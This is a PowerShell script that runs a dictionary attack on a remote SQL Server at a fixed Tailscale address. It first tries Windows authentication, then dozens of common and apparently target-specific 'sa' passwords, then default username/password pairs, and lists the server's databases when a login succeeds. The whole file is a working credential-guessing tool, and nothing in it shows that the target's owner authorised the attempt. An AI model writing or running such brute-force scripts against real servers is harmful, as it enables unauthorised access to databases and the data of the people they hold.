# Test SQL Server connection to remote server via Tailscale
# Tries common SA passwords and Windows Auth

$server = '100.114.106.110,1433'

function Test-SqlAuth {
    param($server, $user, $password, $windowsAuth = $false)

    if ($windowsAuth) {
        $connStr = "Server=$server;Database=master;Integrated Security=True;Connection Timeout=5;TrustServerCertificate=true"
        $label = "Windows Auth"
    } else {
        $connStr = "Server=$server;Database=master;User ID=$user;Password=$password;Connection Timeout=5;TrustServerCertificate=true"
        $label = "SQL Auth ($user / '$password')"
    }

    try {
        $conn = New-Object System.Data.SqlClient.SqlConnection($connStr)
        $conn.Open()
        Write-Host ("  [SUCCESS] " + $label) -ForegroundColor Green

        $cmd = $conn.CreateCommand()
        $cmd.CommandText = "SELECT name FROM sys.databases WHERE database_id > 4 ORDER BY name"
        $reader = $cmd.ExecuteReader()
        $dbs = @()
        while ($reader.Read()) { $dbs += $reader.GetString(0) }
        $reader.Close()
        $conn.Close()

        Write-Host ("    Databases found (" + $dbs.Count + "):") -ForegroundColor Cyan
        $dbs | ForEach-Object { Write-Host "      - $_" }
        return $true
    } catch {
        Write-Host ("  [FAIL]    " + $label + " -> " + $_.Exception.Message.Split("`n")[0]) -ForegroundColor DarkGray
        return $false
    }
}

Write-Host "Testing SQL Server at $server" -ForegroundColor Yellow
Write-Host ""

# Try Windows Auth first
$ok = Test-SqlAuth -server $server -windowsAuth $true
if ($ok) { exit 0 }

# Common SA passwords
$saPasswords = @('', 'sa', 'admin', 'Admin', 'password', 'Password', '123', '1234', '12345',
                 '123456', '1234567', '12345678', '123456789', '1', '12', 'root', 'qwerty',
                 'abc123', 'Abc123', 'pass', 'test', 'Admin123', 'Password1', 'Password123',
                 'sa123', 'sa@123', 'ecas', 'ECAS', 'electricity', 'kahraba', 'fatora',
                 'abbasi', 'Abbasi', 'Abbasi123', 'mohammed', 'Mohammed')

foreach ($pw in $saPasswords) {
    $ok = Test-SqlAuth -server $server -user 'sa' -password $pw
    if ($ok) { exit 0 }
}

# Try common other usernames
$otherUsers = @(
    @('admin', 'admin'), @('admin', 'password'), @('admin', '123456'),
    @('user', 'user'), @('test', 'test'), @('ecas', 'ecas'),
    @('sysadmin', 'sysadmin'), @('dba', 'dba')
)
foreach ($u in $otherUsers) {
    $ok = Test-SqlAuth -server $server -user $u[0] -password $u[1]
    if ($ok) { exit 0 }
}

Write-Host ""
Write-Host "No credentials worked. Need real credentials." -ForegroundColor Yellow
